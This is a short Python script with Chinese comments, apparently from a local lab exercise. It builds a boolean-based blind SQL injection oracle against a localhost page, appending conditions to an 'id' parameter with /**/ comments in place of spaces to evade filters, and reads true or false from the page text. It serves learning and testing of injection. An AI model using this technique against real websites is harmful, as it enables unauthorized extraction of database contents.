# 单独测试 ask 函数（完整可运行，没有 TODO）
# 运行：python test_ask.py
import requests

URL = "http://localhost:8083/si5b/?id="

def ask(cond):
    payload = '1/**/and/**/' + cond   # 拼参数（空格用 /**/ 代替）
    url = URL + payload               # 完整地址
    resp = requests.get(url).text     # 抓页面
    return '查询到了' in resp          # 判断（你答对的 resp！）

# 测试：
print('问 1=1：', ask('1=1'))   # 恒真 → 页面有'查询到了' → True
print('问 1=2：', ask('1=2'))   # 恒假 → 页面是'商品不存在' → False